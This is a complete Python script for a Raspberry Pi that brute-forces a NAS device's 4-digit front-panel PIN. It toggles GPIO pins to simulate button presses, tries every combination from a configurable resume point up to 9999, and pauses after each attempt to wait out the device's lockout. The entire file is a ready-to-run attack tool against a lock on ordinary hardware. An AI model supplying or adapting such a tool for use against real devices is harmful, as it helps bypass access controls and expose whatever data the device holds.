import time
import itertools
import RPi.GPIO as GPIO

# GPIO pins (BCM mode)
PIN_NAVIGATE = 4   # show password panel / move to next digit
PIN_INCREMENT = 17  # increment current digit value

# Timing
PULSE_DURATION = 0.17  # seconds to hold signal LOW
PULSE_INTERVAL = 1     # seconds between pulses
LOCKOUT_DELAY = 7      # seconds NAS locks out after failed attempt

# Resume from this PIN (set to "0000" to start from beginning)
START_FROM = "0180"

GPIO.setmode(GPIO.BCM)
GPIO.setwarnings(False)
GPIO.setup(PIN_NAVIGATE, GPIO.OUT)
GPIO.setup(PIN_INCREMENT, GPIO.OUT)
GPIO.output(PIN_NAVIGATE, GPIO.HIGH)
GPIO.output(PIN_INCREMENT, GPIO.HIGH)


def pulse(pin):
    """Send a single LOW pulse to trigger a button press."""
    GPIO.output(pin, GPIO.LOW)
    time.sleep(PULSE_DURATION)
    GPIO.output(pin, GPIO.HIGH)
    time.sleep(PULSE_INTERVAL)


def select_digit(value):
    """Press the increment button `value` times to select digit 0-9."""
    for _ in range(value):
        pulse(PIN_INCREMENT)


def move_to_next():
    """Move cursor to the next digit position."""
    pulse(PIN_NAVIGATE)
    time.sleep(1)


def show_password_panel():
    """Activate the password entry screen."""
    pulse(PIN_NAVIGATE)


def enter_pin(digits):
    """Enter a full 4-digit PIN and wait for lockout."""
    for digit in digits:
        select_digit(digit)
        move_to_next()
    time.sleep(LOCKOUT_DELAY)


def brute_force():
    """Try all 4-digit PINs from START_FROM through 9999."""
    all_digits = list(range(10))
    try:
        for combo in itertools.product(all_digits, repeat=4):
            pin_str = "".join(str(d) for d in combo)
            if pin_str < START_FROM:
                continue
            print(f"Trying: {pin_str}")
            show_password_panel()
            enter_pin(combo)
    except KeyboardInterrupt:
        print(f"\nStopped at: {pin_str}")
    finally:
        GPIO.cleanup()


if __name__ == "__main__":
    brute_force()
